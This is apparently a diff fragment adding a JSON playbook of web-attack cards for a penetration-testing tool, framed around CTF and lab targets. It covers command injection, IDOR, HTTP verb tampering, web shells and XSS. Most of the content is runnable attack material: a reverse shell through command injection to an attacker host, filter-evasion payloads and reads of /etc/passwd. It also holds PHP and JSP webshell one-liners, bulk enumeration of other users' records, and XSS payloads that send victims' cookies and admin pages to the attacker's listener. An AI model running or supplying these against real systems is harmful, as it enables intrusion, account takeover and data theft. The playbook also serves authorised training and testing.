+    "https://portswigger.net/web-security/os-command-injection"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/ping.php?ip=127.0.0.1;id'",
+     "note": "Separators to rotate through as a baseline: ; %0a (newline) & | && || `id` $(id). Observe both the response body AND the response timing."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s -o /dev/null -w '%{time_total}\\n' 'http://{{target}}/ping.php?ip=127.0.0.1;sleep+5'",
+     "note": "Blind confirmation: a 5-second lag means execution, even with zero output. For ICMP: ;ping+-c4+{{lhost}} while tcpdump runs on your side."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/ping.php?ip=127.0.0.1;cat${IFS}/etc/passwd'",
+     "note": "Filter evasions (Linux): ${IFS} or %09 in place of spaces, ${PATH:0:1} for a slash, {cat,/etc/passwd} brace expansion, quoting/casing (c\"a\"t, WhOaMi on Windows), base64: bash<<<$(base64 -d<<<Y2F0...)"
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/ping.php?ip=127.0.0.1;bash+-c+\"bash+-i+>%26+/dev/tcp/{{lhost}}/{{lport}}+0>%261\"'",
+     "note": "After confirmation: run a reverse shell through the injection. URL-encode the special characters (& → %26, spaces → +). Stand up the listener first (see listener-setup)."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "idor",
+   "title": "Insecure Direct Object Reference (IDOR)",
+   "hypothesis": "Every request that carries a reference to an object (?uid=, ?filename=, /api/users/123, document ids inside JSON) poses an access-control question: is the server checking WHO is asking, or only WHAT is being asked for? Bump ids up, substitute uuids, decode then re-encode base64 or hashed references, and compare against a second account you control — any returned data that isn't yours is the finding. Enumerating at scale escalates one IDOR into a data breach.",
+   "tool": "ffuf",
+   "tools": [
+    "ffuf",
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "web.parameterized",
+    "web.content_map"
+   ],
+   "produces": [
+    "web.idor_candidate"
+   ],
+   "priority": 66,
+   "proves": "flags an IDOR access-control lead (another object's data returned for a bumped/substituted id)",
+   "does_not_prove": "an unconfirmed lead only — no verified credential or access; any files/creds pulled through it come back via `obol ingest`, not this card's parse",
+   "report": {
+    "finding": "Insecure Direct Object Reference (Broken Access Control)",
+    "severity": "high"
+   },
+   "refs": [
+    "https://portswigger.net/web-security/access-control/idor"
+   ],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "echo 'Create TWO accounts (or use your account + another known user). Capture a request that returns YOUR object — profile, invoice, file — then replay it with the id changed.'",
+     "note": "How to do it: replay the reference parameter in Burp Repeater (uid=1 → uid=2) and compare against the second account. Inspect COOKIES and JSON bodies too — references lurk there as well."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s -H 'Cookie: session=YOURS' 'http://{{target}}/download.php?filename=ZmlsZV8xMjMucGRm' | head -c 200 | xxd | head",
+     "note": "Encoded references: base64 (filename=ZmlsZ...), hashes, uuids. Decode it, work out the scheme, then re-encode the adjacent value. echo ZmlsZV8xMjMucGRm | base64 -d"
+    },
+    {
+     "tool": "ffuf",
+     "run": "ffuf -u 'http://{{target}}/api/users/FUZZ' -w <(seq 1 5000) -H 'Cookie: session=YOURS' -mc 200 -fs 0",
+     "note": "Bulk IDOR enumeration: fuzz across the id range with your session and filter out empty or error responses. Any hit that returns another user's data confirms the class."
+    },
+    {
+     "tool": "sh",
+     "run": "grep -rhoE 'url:\"[^\"]+\"|ajax\\(' app.js | sort -u",
+     "note": "Client-side AJAX calls expose admin or hidden endpoints holding object references that the UI never surfaces for your role. Read the JS before deciding there's nothing left to fuzz."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "verb-tampering",
+   "title": "HTTP Verb Tampering",
+   "hypothesis": "Authentication rules and framework settings frequently account for GET and POST alone: <Limit GET POST> in Apache, route decorators, WAF rules. Striking the same endpoint with HEAD, PUT, OPTIONS, or PATCH can slip straight past authentication — or grant file writes (PUT) and resource deletion (DELETE). It costs almost nothing to try anywhere: every 401/403 endpoint is worth a verb sweep.",
+   "tool": "curl",
+   "tools": [
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "web.content_map",
+    "foothold.webshell"
+   ],
+   "priority": 80,
+   "proves": "confirms a catalogue of uncovered web content and a web shell",
+   "does_not_prove": "execution within the web/application context only — not any elevated privilege",
+   "report": {
+    "finding": "HTTP Verb Tampering / Method-Based Auth Bypass",
+    "severity": "high"
+   },
+   "refs": [
+    "https://owasp.org/www-community/attacks/HTTP_Verb_Tampering"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s -X OPTIONS -i http://{{target}}/admin/ | grep -i allow",
+     "note": "Read the Allow header to begin — the server discloses which verbs it will take."
+    },
+    {
+     "tool": "curl",
+     "run": "for v in GET POST HEAD PUT DELETE PATCH TRACE; do echo -n \"$v: \"; curl -s -o /dev/null -w '%{http_code} %{size_download}\\n' -X $v http://{{target}}/admin/; done",
+     "note": "Run the verbs across the protected endpoint. A 200 where GET returned 401/403 is an auth bypass via verb. HEAD handing back headers on a GET that 403s is already a partial leak."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s -X PUT -d '<% out.print(\"pwned\"); %>' http://{{target}}/uploads/test.jsp -i",
+     "note": "Where PUT is honored on a writable path, drop a webshell in directly (the classic Tomcat/IIS case). Then GET it to confirm execution."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "web-shells",
+   "title": "Web Shells (Laudanum & Friends)",
+   "hypothesis": "As soon as you can write into a webroot (via upload, LFI-to-log, SQL OUTFILE, a redis write, a verb-tampered PUT), you need a shell file suited to the server's technology. Kali bundles vetted sets: Laudanum (asp/aspx/jsp/php/cfm) and the /usr/share/webshells directory (php-reverse-shell, simple-backdoor, qsd). Learn the locations so you aren't hand-writing shell code at 3am — choose the right file, drop in your IP and port, upload, trigger.",
+   "tool": "sh",
+   "tools": [
+    "sh",
+    "curl"
+   ],
+   "os": [
+    "linux",
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "web.upload_confirmed",
+    "foothold.webshell",
+    "web.lfi_confirmed"
+   ],
+   "produces": [
+    "access.shell",
+    "web.cmdi_confirmed"
+   ],
+   "priority": 80,
+   "proves": "confirms an interactive shell and a working command injection",
+   "does_not_prove": "execution within the web/application context only — not any elevated privilege",
+   "report": {
+    "finding": "Web Shell Deployed via File Write Primitive",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/jbarcia/Web-Shells"
+   ],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "ls /usr/share/webshells/ /usr/share/laudanum/ 2>/dev/null",
+     "note": "The Kali stock: /usr/share/webshells (php/php-reverse-shell.php, simple-backdoor.php, aspx, jsp) and /usr/share/laudanum (command shells by language). Select by server technology: PHP → .php, IIS → .aspx, Tomcat → .jsp or a WAR (see tomcat-deploy)."
+    },
+    {
+     "tool": "sh",
+     "run": "cp /usr/share/webshells/php/php-reverse-shell.php prs.php && nano prs.php",
+     "note": "Set $ip and $port near the top, then upload. If you'd rather have a quieter cmd shell: simple-backdoor.php executes ?cmd= commands."
+    },
+    {
+     "tool": "sh",
+     "run": "echo '<?php system($_GET[\"c\"]); ?>' > cmd.php",
+     "note": "The one-liner for when the collections aren't around. The ASPX counterpart is the Laudanum aspx shell; for JSP, Laudanum cmd.jsp."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/uploads/cmd.php?c=id'",
+     "note": "Trigger and confirm it BEFORE moving up to a reverse shell — a webshell that won't run is a path problem, not a payload problem (see the file-upload readback)."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "xss-basics",
+   "title": "Cross-Site Scripting (Cookie Theft Angle)",
+   "hypothesis": "On a CTF or lab box XSS is seldom the objective itself — it's a credential cannon: grab the admin's session cookie (or coerce the admin's browser into fetching a URL that reveals a page only they can view), then hijack their session. Try every input that reflects back (search, comments, usernames, error pages), then arm it with a callback to your listener. Reflected XSS depends on delivery (someone clicking a link); stored XSS goes off by itself and is the one you're hoping for.",
+   "tool": "curl",
+   "tools": [
+    "curl",
+    "python3"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "web.xss_confirmed",
+    "credential.candidate",
+    "loot.files"
+   ],
+   "priority": 66,
+   "proves": "confirms candidate credentials and retrieved files",
+   "does_not_prove": "unconfirmed leads only — neither a verified credential nor access",
+   "report": {
+    "finding": "Cross-Site Scripting Leading to Session Theft",
+    "severity": "medium"
+   },
+   "refs": [
+    "https://portswigger.net/web-security/cross-site-scripting"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/search.php?q=<b>xssprobe123</b>' | grep -o xssprobe123",
+     "note": "Establish reflection first using a harmless unique string, then step up to <script>alert(1)</script> in a browser. Form inputs, headers (User-Agent), and error pages all reflect."
+    },
+    {
+     "tool": "python3",
+     "run": "python3 -m http.server 8000",
+     "note": "Your callback listener. Any request landing on it proves a browser ran your payload — and it brings along whatever you requested (cookie, page content)."
+    },
+    {
+     "tool": "sh",
+     "run": "echo \"<script>new Image().src='http://{{lhost}}:8000/c?c='+document.cookie</script>\"",
+     "note": "The payload: send the victim's cookie out to your listener. Plant it through a stored field (comment, username, profile) or a reflected link. Then reuse the cookie in your own browser/curl: -H \"Cookie: session=STOLEN\"."
+    },
+    {
+     "tool": "sh",
+     "run": "echo \"<script>fetch('/admin').then(r=>r.text()).then(d=>new Image().src='http://{{lhost}}:8000/p?d='+btoa(d))</script>\"",
+     "note": "A second approach: drive the ADMIN browser to fetch an admin-only page and exfiltrate its contents base64-encoded. This reads pages you can't reach yourself (the well-known HTB pattern)."
+    }
+   ],
+   "autonomy": "manual"
+  }
+ ]
+}
